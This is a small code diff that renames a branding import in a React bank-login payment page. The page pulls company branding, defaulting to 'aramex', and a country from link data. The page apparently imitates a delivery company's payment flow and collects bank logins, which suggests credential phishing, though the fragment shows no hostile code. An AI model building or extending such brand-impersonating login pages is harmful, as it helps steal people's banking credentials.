@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Badge } from "@/components/ui/badge";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getCompanyBranding } from "@/lib/companyBranding";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck, Shield, Lock as LockIcon, CheckCircle } from "lucide-react";
@@ -43,7 +43,7 @@ const PaymentBankLogin = () => {
   
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const branding = getCompanyBranding(serviceKey);
 
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
